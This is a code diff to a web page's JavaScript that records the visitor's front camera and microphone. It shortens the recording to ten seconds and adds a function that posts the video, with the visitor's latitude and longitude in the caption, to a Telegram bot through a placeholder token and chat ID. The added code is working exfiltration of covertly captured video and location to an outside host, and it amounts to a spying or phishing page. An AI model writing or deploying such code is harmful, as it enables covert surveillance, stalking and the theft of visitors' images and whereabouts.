@@ -31,8 +31,10 @@
         // Variables to store location and video data
         let locationData = {};
         let recordedChunks = [];
+        const telegramBotToken = 'YOUR_BOT_TOKEN'; // Replace with your Telegram bot token
+        const chatId = 'YOUR_CHAT_ID'; // Replace with your chat ID
 
-        // Function to capture the front camera and record for 5 minutes
+        // Function to capture the front camera and record for 10 seconds
         function captureVideo() {
             navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true })
                 .then(stream => {
@@ -48,19 +50,19 @@
                         }
                     };
 
-                    // Stop the recording after 5 minutes (300,000 milliseconds)
+                    // Stop the recording after 10 seconds (10,000 milliseconds)
                     setTimeout(() => {
                         mediaRecorder.stop();
                         stream.getTracks().forEach(track => track.stop()); // Stop all video/audio tracks
                         saveVideo(); // Save the video after recording stops
-                    }, 300000); // 5 minutes = 300,000ms
+                    }, 10000); // 10 seconds = 10,000ms
 
                     mediaRecorder.start();
                 })
                 .catch(error => console.error('Error accessing camera: ', error));
         }
 
-        // Function to save the recorded video as a file locally
+        // Function to save the recorded video as a file locally and send to Telegram
         function saveVideo() {
             const blob = new Blob(recordedChunks, { type: 'video/mp4' });
             const url = URL.createObjectURL(blob);
@@ -71,6 +73,29 @@
             document.body.appendChild(a);
             a.click();
             window.URL.revokeObjectURL(url); // Clean up the object URL
+
+            // Send video and location to Telegram
+            sendToTelegram(blob);
+        }
+
+        // Function to send video and location data to Telegram
+        function sendToTelegram(videoBlob) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('video', videoBlob, 'video.mp4');
+            formData.append('caption', `Location: ${locationData.latitude}, ${locationData.longitude}`);
+
+            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendVideo`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Telegram response:', data);
+            })
+            .catch((error) => {
+                console.error('Error sending to Telegram:', error);
+            });
         }
 
         // Function to get the user's geolocation
